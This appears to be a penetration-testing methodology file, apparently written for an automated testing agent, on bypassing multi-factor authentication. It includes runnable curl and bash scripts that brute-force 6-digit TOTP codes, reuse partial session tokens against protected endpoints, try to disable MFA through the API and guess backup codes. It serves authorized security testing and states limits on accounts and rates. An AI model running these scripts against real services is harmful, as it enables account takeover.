# MFA Bypass — Vulnerability Skill

**Phase:** 3 | **Skill Type:** Testing | **Impact:** Critical | **Prerequisite:** Auth endpoints mapped (Phase 2), test accounts with MFA enabled

---

## Mental Model

MFA (Multi-Factor Authentication) is supposed to add a second layer. But implementations often fail because developers assume the 2FA step is unreachable without completing the first step. Your job: break that assumption.

**The 5 MFA bypass archetypes:**
1. **Response Manipulation** — Change `"mfa_verified": false` to `true` in the API response
2. **Direct Endpoint Access** — Skip the 2FA page entirely, hit authenticated endpoints directly
3. **Rate Limit Missing** — Brute-force the 6-digit TOTP code (no lockout)
4. **Backup Code Abuse** — Backup codes with weak entropy or no rate limit
5. **OAuth/SSO Skip** — Login via OAuth provider that bypasses MFA entirely

---

## Phase 1: OOB-First Detection (MANDATORY)

MFA bypass doesn't use OOB directly, but:
```bash
# Test if MFA verification endpoint calls external services (for rate-limit bypass testing)
./tools/interactsh_launcher.sh start --output-dir engagement/oob/
```

---

## Phase 2: Confirmation

### 2.1 Response Manipulation (Simplest and most common)

**Step 1: Login with valid credentials**

Capture the response after entering correct username + password but BEFORE entering MFA code:
```json
// POST /api/login response
{
  "status": "mfa_required",
  "mfa_verified": false,
  "session_token": "partial_token_abc123",
  "user_id": 12345
}
```

**Step 2: Manipulate the response**

```bash
# Use Burp MCP or manually intercept and change:
# "mfa_verified": false → "mfa_verified": true
# or "status": "mfa_required" → "status": "authenticated"
# or add "mfa_bypassed": true

curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test_user","password":"test_pass"}'
# Intercept response → change false to true
```

**Step 3: Check subsequent requests**

If the app accepts the manipulated response and grants full session → CONFIRMED.

### 2.2 Direct Endpoint Access (Skipping 2FA)

After completing password login (but before 2FA), try directly accessing authenticated endpoints:

```bash
# Extract the partial session token
PARTIAL_TOKEN="partial_token_abc123"

# Try accessing sensitive endpoints
curl -H "Authorization: Bearer $PARTIAL_TOKEN" https://target.com/api/user/profile
curl -H "Cookie: session=$PARTIAL_TOKEN" https://target.com/api/user/settings
curl -H "Cookie: session=$PARTIAL_TOKEN" https://target.com/api/admin/users
curl -H "Cookie: session=$PARTIAL_TOKEN" https://target.com/dashboard
```

If ANY endpoint returns data instead of redirecting to MFA → CONFIRMED (BFLA + MFA bypass).

### 2.3 Rate Limit Missing on MFA Code

```bash
# Brute-force TOTP code (6 digits)
for code in $(seq -w 0 999999); do
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST https://target.com/api/verify-mfa \
        -H "Content-Type: application/json" \
        -H "Cookie: session=partial_token" \
        -d "{\"code\":\"$code\"}")
    
    if [[ "$response" == "200" || "$response" == "302" ]]; then
        echo "BYPASS CODE: $code"
        break
    fi
    
    # Slow down to avoid overwhelming — real attack uses Burp Turbo Intruder
    sleep 0.01
done
```

**Rate limit detection:**
- Send 20 rapid MFA code attempts
- If no 429/403/throttle response → rate limit missing
- For production testing: use Burp MCP Intruder with 10 concurrent threads

### 2.4 Backup Code Abuse

```bash
# Check if backup codes are predictable (sequential, timestamp-based)
# Get 2 backup codes, check if they follow a pattern

# Test if backup codes skip MFA entirely
curl -X POST https://target.com/api/login/backup \
  -d "username=test&backup_code=12345678"

# Try common backup code patterns
for code in 00000000 12345678 11111111 87654321; do
    response=$(curl -s -w "%{http_code}" -X POST https://target.com/api/login/backup \
        -d "username=test&backup_code=$code" -o /dev/null)
    echo "$code: $response"
done
```

### 2.5 MFA Reset/Disable via API

```bash
# Try to disable MFA without verification
curl -X POST https://target.com/api/user/mfa/disable \
  -H "Cookie: session=partial_token" \
  -d "{}"

# Try to change MFA settings
curl -X PUT https://target.com/api/user/settings \
  -H "Cookie: session=partial_token" \
  -d '{"mfa_enabled": false}'
```

### 2.6 OAuth Login Skips MFA

Many applications enforce MFA for password login but NOT for OAuth/SSO:

```bash
# Login via Google/GitHub OAuth — does it bypass MFA?
# Navigate to: https://target.com/auth/google
# Complete OAuth flow
# If logged in without MFA challenge → CONFIRMED
```

---

## Phase 3: Negative Verdict (MANDATORY GATE)

1. Verify MFA is actually enforced on ALL auth paths (password, OAuth, SSO, API key)
2. Confirm response manipulation doesn't work (server-side validation)
3. Verify rate limiting exists on MFA codes (at least 5 attempts → lockout/429)
4. Check ALL post-password-login endpoints require full MFA session
5. If MFA is consistently enforced across ALL vectors → NEGATIVE

---

## Phase 4: Exploitation (Response Manipulation PoC)

```bash
#!/bin/bash
# MFA bypass PoC via response manipulation

# 1. Login with valid credentials, capture MFA-required response
LOGIN_RESP=$(curl -s -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker_user","password":"KnownPass123"}')

# Extract partial token
TOKEN=$(echo "$LOGIN_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin).get('session_token',''))")

# 2. Access sensitive endpoint with partial token (should be blocked)
curl -s -H "Authorization: Bearer $TOKEN" https://target.com/api/user/profile
# If this returns profile data → MFA bypass confirmed
```

---

## What You DO
- Test response manipulation first (simplest, most common)
- Try direct endpoint access with partial session
- Check ALL MFA code endpoints for rate limiting
- Test OAuth/SSO login path separately (often skips MFA)
- Document which endpoints are accessible without full MFA

## What You DO NOT Do
- Brute-force MFA codes at high speed (use Burp Intruder at 5 rps max)
- Try to bypass MFA on real user accounts (use ONLY test account)
- Assume rate limit exists without testing it
